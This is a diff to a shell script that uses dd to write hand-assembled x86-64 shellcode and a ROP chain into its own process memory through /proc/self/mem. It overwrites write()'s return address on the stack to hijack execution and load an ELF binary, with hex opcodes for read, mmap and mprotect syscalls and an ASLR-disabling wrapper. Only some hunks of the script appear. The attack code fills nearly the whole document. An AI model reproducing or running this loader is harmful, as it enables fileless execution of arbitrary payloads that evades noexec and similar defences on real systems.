@@ -1,11 +1,6 @@
 #!/bin/sh
 
-# A _very_ long filename may shift the stack too much and oblige to lower
-# the `write_to_addr' variable.
 filename=/bin/dd
-# Position in the stack we start to overwrite. We are trying to overflow
-# write()'s stack and take control from there.
-write_to_addr=$((0x7fffffffe000))
 
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
 # Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
@@ -216,10 +211,6 @@ shellcode_loader()
         local phent=${phtab:$((i * phentsize * 2)):$((phentsize * 2))}
         local phenttype=${phent:0:8}
         local prot=$(endian ${phent:8:8})
-        local offset=$(endian ${phent:16:16})
-        local virt=$(endian ${phent:32:16})
-        local fsize=${phent:64:16}
-        local memsz=$(endian ${phent:80:16})
         if [ $phenttype = "51e57464" ] # type == GNU_STACK
         then
             if [ $((0x$prot & 1)) -eq 1 ] # Stack must be executable
@@ -233,6 +224,11 @@ shellcode_loader()
             continue
         fi
         if [ $phenttype != "01000000" ]; then continue; fi # type != LOAD
+        local offset=$(endian ${phent:16:16})
+        local virt=$(endian ${phent:32:16})
+        local fsize=${phent:64:16}
+        local memsz=$(endian ${phent:80:16})
+
         if [ $((0x$offset)) -eq 0 ]
         then
             if [ $((0x$virt)) -lt $((0x400000)) ] # PIE binaries
@@ -269,9 +265,10 @@ shellcode_loader()
             sc=$sc"ba03000000" # RW
             sc=$sc"0f05"
 
-            # read() (makes sure that it reads exactly $fsize bytes)
-            sc=$sc"4831ff48be${origvirt}48ba"$fsize
-            sc=$sc"4889f80f054829c24801c64885d275f0"
+            # read()
+            sc=$sc"4831ff48be${origvirt}48ba${fsize}4889f80f05"
+            # and make sure to read exactly $fsize bytes
+            sc=$sc"4829c24801c64885d275f0"
 
             # mprotect()
             sc=$sc"4831c0b00a"
@@ -617,8 +614,17 @@ sc_addr=$(endian $(printf %016x $sc_addr))
 rop=$(craft_rop $sc_len)
 rop_len=$((${#rop} / 2))
 
-payload=$(echo -n $rop$payload2 | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+# Position in the stack we start to overwrite. We are trying to overflow
+# write()'s stack and take control from there. I've found experimentally that
+# the RIP(s) for write() is always in the last page of the stack, and that it is
+# consistent across versions and compilations of dd... in ARM too!
+write_to_addr=$(echo "$dd_maps" | grep -F "[stack]" | cut -d' ' -f1 |\
+                cut -d'-' -f2)
+write_to_addr=$(((0x$write_to_addr - 1) & (~0xfff)))
+
+
+payload=$(printf %s "$rop$payload2" | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # I'm going in, wish me luck...
-printf $payload |\
+printf %b "$payload" |\
 (sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
 seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
